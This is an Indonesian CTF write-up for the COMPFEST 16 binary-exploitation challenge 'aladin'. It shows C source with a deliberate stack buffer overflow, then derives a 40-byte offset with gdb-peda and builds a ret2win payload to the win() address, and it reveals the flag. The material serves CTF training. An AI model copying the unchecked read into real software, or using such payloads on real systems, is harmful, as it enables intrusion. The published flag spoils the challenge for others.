# [500 pts] aladin
### Category: Binary Exploitation

**Deskripsi:**
>terkadang sebuah perjuangan tidak hanya memerlukan usaha, tapi memerlukan bantuan dari dunia gaib, hehehe...
>
>Author: nabilmuafa
>
>nc challenges.ctf.compfest.id 20006

**chall.c:**
```c
#include <stdio.h>
#include <stdlib.h>

/* gcc -Wl,-z,relro,-z,now -no-pie -fno-stack-protector chall.c -o chall */

void win(int mantra)
{
    puts("wow! mantra kamu benar! sebagai hadiahnya, jin akan memberikan kamu suatu mantra lain yang dapat kamu gunakan untuk menang ctf compfest (semoga beneran).");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
        printf("File flag.txt does not exist! >:(");
        return 69;
    }
    char flag[0x100];
    fgets(flag, 0x100, f);
    puts(flag);
}

void vuln()
{
    char mantra[32];

    puts("kamu menemukan sebuah gua... di dalam gua tersebut ada jin yang bisa memberi kamu akses jadi pemenang ctf compfest 16...");
    puts("tapi syaratnya kamu harus bisa menyebutkan mantra sakti yang diinginkan jin tersebut...\n");
    puts("jin: 'tenang saja... soal ini tidak toksik seperti soal tahun lalu... tapi kamu harus menyebutkan mantra sakti...'\n");
    printf("sebutkan mantra sakti tersebut: ");

    read(0, mantra, 0x200);

    puts("duar! jin tersebut memproses mantra sakti kamu... apakah kamu akan jadi pemenang ctf compfest 16...?\n");
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    vuln();
    puts("yah, nampaknya mantra kamu masih salah...");
    return 0;
}
```

### Solusi:

Diberikan source code dan binary dari source code yang sudah di compile, awalnya saya cek keamanan dari file binary tersebut:
```
checksec chall
```

**Output:**
```
Arch:     amd64-64-little  
RELRO:    Full RELRO  
Stack:    No canary found  
NX:       NX enabled  
PIE:      No PIE (0x400000)   
```

 Tidak ada stack canary yang melindungi stack, sehingga mungkin untuk dilakukan serangan buffer overflow, untuk lebih membuktikan mari jalankan program:
 ```
 chmod +x chall  
 ./chall
 ```

**Output:**
```
kamu menemukan sebuah gua... di dalam gua tersebut ada jin yang bisa memberi kamu akses jadi pemenang ctf compfest 16...
tapi syaratnya kamu harus bisa menyebutkan mantra sakti yang diinginkan jin tersebut...
 
jin: 'tenang saja... soal ini tidak toksik seperti soal tahun lalu... tapi kamu harus menyebutkan mantra sakti...'
 
sebutkan mantra sakti tersebut:
```

Terlihat program tersebut meminta input dari pengguna dengan ekspektasi diberikan input string, dengan mencoba menginput string yang sangat panjang (misal 100 karakter), 
```
zsh: segmentation fault  ./chall
```

Terjadi segmentation fault sehingga terbukti kita bisa melakukan exploit pada buffer. Terlihat di source code bahwa flag akan di print pada fungsi win().
Maka kita akan melakukan exploit dengan menginput string berupa format:
> (padding offset) + (address fungsi win())

Gunakan _objdump_ untuk mencari address fungsi win():
```
objdump -d chall | grep win
```

**Output:**
```
00000000004011d6 <win>:  
401213:       75 13                   jne    401228 <win+0x52>  
401226:       eb 27                   jmp    40124f <win+0x79>
```

Didapatkan address yaitu 0x4011d6, kemudian cari offset menggunakan gdb-peda dengan memakai command pattern. Cara menginstall gdb-peda: https://n0a110w.github.io/notes/security-stuff/peda.html 

Pattern akan dimasukkan kedalam file bernama "payload" dan akan di-input kedalam program. Lakukan dengan command: 
```
gdb-peda chall  
pattern create 100 payload  
run < payload
```

Yang perlu kita lihat yaitu pada bagian registers,

**Output:**
```assembly
 RAX  0x66
 RBX  0x7fffffffdf18 —▸ 0x7fffffffe286 ◂— '/home/kali/current/chall'
 RCX  0x7ffff7ec64e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7f9f710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x7ffff7f9e643 (_IO_2_1_stdout_+131) ◂— 0xf9f710000000000a /* '\n' */
 R8   0
 R9   0x7ffff7fcfb30 (_dl_fini) ◂— push rbp
 R10  0x7fffffffdb30 ◂— 0x20 /* ' ' */
 R11  0x202
 R12  0
 R13  0x7fffffffdf28 —▸ 0x7fffffffe29f ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0
 R15  0
 RBP  0x6141414541412941 ('A)AAEAAa')
 RSP  0x7fffffffddf8 ◂— 0x4141464141304141 ('AA0AAFAA')
 RIP  0x4012bb (vuln+106) ◂— ret 
```

Terjadi segmentation fault seperti sebelumnya, hal ini terjadi karena return address yang akan dijalankan RIP ter-overwrite oleh input yang kita masukkan.

Karena menggunakan RIP, maka program pasti menggunakan arsitektur 64-bit. Pada arsitektur 64-bit return address yang ter-overwrite akan berada di RSP,
sehingga untuk mencari offset kita melihat string yang masuk ke RSP dan kita gunakan command pattern offst dari gdb-peda:
```
pattern offset AA0AAFAA
```

**Output:**
```
AA0AAFAA found at offset: 40
```

Maka didapatkan offset sebanyak 40 karakter, yang artinya kita harus meng-input 40 karakter sebelum bisa mulai meng-overwrite return address fungsi vuln().
Untuk itu, kita gunakan library pwntools untuk membuat solver script ini. 

Pada solver script kita akan membuat payload yang berupa 40 karakter 'A' + p64(0x4011d6). Fungsi p64() adalah fungsi builtin dari pwntools yang akan menyesuaikan format address menjadi little endian.

Lebih lanjut mengenai Endiannes: https://www.geeksforgeeks.org/little-and-big-endian-mystery/
> Note: gunakan fungsi p32() jika program menggunakan arsitektur 32-bit

Solver script: [aladin.py](https://github.com/FieryBanana101/COMPFEST-16_TeamBaruBelajarCTF/blob/main/Hacker%20Class/aladin/aladin.py)

> Flag: **COMPFEST16{still_easy_ret2win_right?_a4e27d3beb}**

Problem ini merupakan binary exploitation tipe ret2win, untuk lebih lanjut: https://ir0nstone.gitbook.io/notes/types/stack/ret2win

